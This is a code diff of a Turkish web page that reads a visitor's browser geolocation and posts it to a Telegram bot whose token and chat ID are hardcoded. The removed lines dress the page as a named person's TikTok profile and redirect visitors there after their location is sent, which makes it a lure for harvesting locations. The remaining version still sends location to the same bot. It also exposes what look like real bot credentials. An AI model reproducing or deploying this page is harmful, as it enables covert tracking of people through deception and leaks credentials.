@@ -2,41 +2,25 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Konum Gönder & TikTok Profiline Git</title>
+  <title>Konum Gönderici</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
+    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+    button {
+      font-size: 18px; padding: 15px 25px; cursor: pointer;
+      border: none; border-radius: 8px; background: #007bff; color: white;
     }
-    #sendLocationBtn {
-      font-size: 18px;
-      padding: 15px 25px;
-      cursor: pointer;
-      border: none;
-      border-radius: 8px;
-      background-color: #ff0050;
-      color: white;
-    }
-    #sendLocationBtn:hover {
-      background-color: #e60046;
-    }
-    #status {
-      margin-top: 20px;
-      font-weight: bold;
-    }
+    button:hover { background: #0056b3; }
+    #status { margin-top: 20px; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h1>@ilayda.yldrm84 TikTok Profili</h1>
-  <p>Konumunu paylaşmak için butona bas.</p>
+  <h1>Konum Gönderici</h1>
   <button id="sendLocationBtn">📍 Konumumu Gönder</button>
   <p id="status"></p>
 
   <script>
     const BOT_TOKEN = "7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA";
     const CHAT_ID = "6358000072";
-    const TIKTOK_PROFILE_URL = "https://www.tiktok.com/@ilayda.yldrm84";
 
     const statusEl = document.getElementById("status");
     const btn = document.getElementById("sendLocationBtn");
@@ -45,7 +29,6 @@
       statusEl.textContent = "📍 Konum alınıyor...";
       if (!navigator.geolocation) {
         statusEl.textContent = "❌ Tarayıcınız konum desteği sunmuyor.";
-        window.location.href = TIKTOK_PROFILE_URL;
         return;
       }
 
@@ -65,29 +48,17 @@
           })
           .then(res => {
             if (res.ok) {
-              statusEl.textContent = "✅ Telegram'a gönderildi, yönlendiriliyorsunuz...";
-              setTimeout(() => {
-                window.location.href = TIKTOK_PROFILE_URL;
-              }, 1500);
+              statusEl.textContent = "✅ Telegram'a başarıyla gönderildi.";
             } else {
-              statusEl.textContent = "❌ Telegram'a gönderilemedi, yönlendiriliyorsunuz...";
-              setTimeout(() => {
-                window.location.href = TIKTOK_PROFILE_URL;
-              }, 1500);
+              statusEl.textContent = "❌ Telegram'a gönderilemedi.";
             }
           })
           .catch(() => {
-            statusEl.textContent = "❌ Telegram gönderiminde hata, yönlendiriliyorsunuz...";
-            setTimeout(() => {
-              window.location.href = TIKTOK_PROFILE_URL;
-            }, 1500);
+            statusEl.textContent = "❌ Telegram gönderiminde hata oluştu.";
           });
         },
         error => {
           statusEl.textContent = "❌ Konum alınamadı: " + error.message;
-          setTimeout(() => {
-            window.location.href = TIKTOK_PROFILE_URL;
-          }, 1500);
         }
       );
     });
